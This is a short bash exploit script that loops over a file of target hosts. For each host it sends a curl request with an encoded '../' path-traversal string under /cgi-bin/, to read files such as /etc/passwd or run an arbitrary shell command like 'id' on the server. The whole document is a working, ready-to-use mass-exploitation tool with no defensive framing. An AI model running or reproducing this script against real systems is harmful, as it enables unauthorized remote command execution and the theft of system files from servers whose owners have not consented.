#!/bin/bash

if [[ -z $1 || -z $2 || -z $3 ]]; then
    echo "Usage: /enigma.sh target_inside_a_file /etc/passwd id"
    exit 1
fi

for host in $(cat "$1"); do
    echo "Target: $host"
    curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2"
done